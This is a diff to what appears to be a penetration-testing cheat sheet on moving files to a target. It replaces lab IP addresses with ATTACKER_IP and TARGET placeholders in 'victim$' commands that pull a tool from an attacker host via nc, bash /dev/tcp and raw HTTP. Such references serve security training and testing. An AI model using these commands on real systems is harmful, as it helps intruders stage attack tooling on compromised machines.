@@ -29,16 +29,16 @@ attacker$ nc -q 0 TARGET 8000 < tool  # or: ncat --send-only TARGET 8000 < tool
 
 # You listen, target pulls from you (for inbound-blocked targets)
 attacker$ sudo nc -l -p 443 -q 0 < tool
-victim$ nc 10.10.14.5 443 > tool
+victim$ nc ATTACKER_IP 443 > tool
 ```
 
 ## Bash /dev/tcp (no nc on the target)
 
 ```bash
 # Receive a file a listener is sending
-victim$ cat < /dev/tcp/10.10.14.5/443 > tool
+victim$ cat < /dev/tcp/ATTACKER_IP/443 > tool
 # Or speak HTTP by hand to a web server
-victim$ exec 3<>/dev/tcp/10.10.10.5/80; echo -e "GET /f HTTP/1.1\nHost: x\n\n" >&3; cat <&3
+victim$ exec 3<>/dev/tcp/TARGET/80; echo -e "GET /f HTTP/1.1\nHost: x\n\n" >&3; cat <&3
 ```
 
 ## PowerShell Remoting (WinRM)
